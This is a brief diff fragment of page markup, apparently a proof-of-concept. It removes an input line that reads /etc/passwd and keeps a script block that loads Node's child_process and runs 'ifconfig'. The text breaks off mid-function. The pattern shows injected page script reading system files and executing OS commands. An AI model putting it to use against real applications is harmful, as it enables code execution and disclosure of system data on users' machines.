@@ -1,5 +1,3 @@
-<input type="file" onchange="readFile(/etc/passwd)">
-
 <script>
 var process = require('child_process');
 process.exec('ifconfig',function (err,stdout,stderr) {
